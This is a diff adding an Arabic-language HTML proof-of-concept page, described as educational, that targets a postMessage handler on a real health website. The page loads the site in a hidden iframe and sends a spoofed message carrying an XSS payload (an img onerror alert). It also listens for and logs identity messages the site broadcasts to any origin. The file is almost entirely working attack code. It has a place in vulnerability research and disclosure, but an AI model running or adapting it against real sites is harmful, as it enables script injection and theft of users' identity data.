@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>صفحة اختبار الثغرة - تعليمي</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; text-align: center; }
+        .status { color: red; font-weight: bold; margin: 20px; }
+        iframe { width: 0; height: 0; border: none; visibility: hidden; }
+    </style>
+</head>
+<body>
+    <h1>صفحة اختبار اختراق (Exploit PoC)</h1>
+    <p>هذه الصفحة تحاكي هجوم <b>DOM-based XSS</b> عبر ثغرة <code>postMessage</code>.</p>
+    <div id="log" class="status">جاري تشغيل الهجوم...</div>
+
+    <iframe id="victimFrame" src="https://www.webmd.com/"></iframe>
+
+    <script>
+        const victimWindow = document.getElementById('victimFrame').contentWindow;
+
+        // دالة لإرسال الرسالة المفخخة
+        function launchExploit() {
+            console.log("إرسال الحمولة (Payload)...");
+            
+            const payload = {
+                _isId5Message: true, // تخطي فحص الهوية في الكود المصاب
+                src: "attacker-id",  // أي معرف وهمي
+                type: "PROXY_METHOD_CALL", // استهداف معالج البروكسي
+                payload: {
+                    // هنا يتم حقن الكود. إذا كان الموقع يستخدم هذا الحقل في DOM
+                    // سيتم تنفيذ الـ alert فوراً.
+                    name: "test",
+                    args: ["<img src=x onerror=\"alert('تم اختراق الموقع بنجاح! \\n\\n المصدر: ' + document.domain);\">"]
+                }
+            };
+
+            // إرسال الرسالة مع استخدام "*" لاستغلال الثغرة
+            victimWindow.postMessage(payload, "*");
+            
+            document.getElementById('log').innerText = "تم إرسال الرسالة! افحص إطار المتصفح.";
+        }
+
+        // الانتظار حتى يتم تحميل صفحة الضحية تماماً
+        window.onload = () => {
+            setTimeout(launchExploit, 3000); // مهلة 3 ثوانٍ للتأكد من تحميل الـ Scripts
+        };
+
+        // محاولة اعتراض بيانات الهوية المسربة (Exfiltration)
+        window.addEventListener("message", (event) => {
+            // بما أن الكود المصاب يستخدم "*" و يقوم بعمل Broadcast لجميع الإطارات،
+            // المهاجم يمكنه سماع الرسائل المسربة هنا.
+            if (event.data && event.data._isId5Message) {
+                console.log("تم اعتراض بيانات مسربة من الموقع:", event.data);
+                document.getElementById('log').innerHTML += `<br>تم اعتراض بيانات: ${JSON.stringify(event.data)}`;
+            }
+        });
+    </script>
+</body>
+</html>
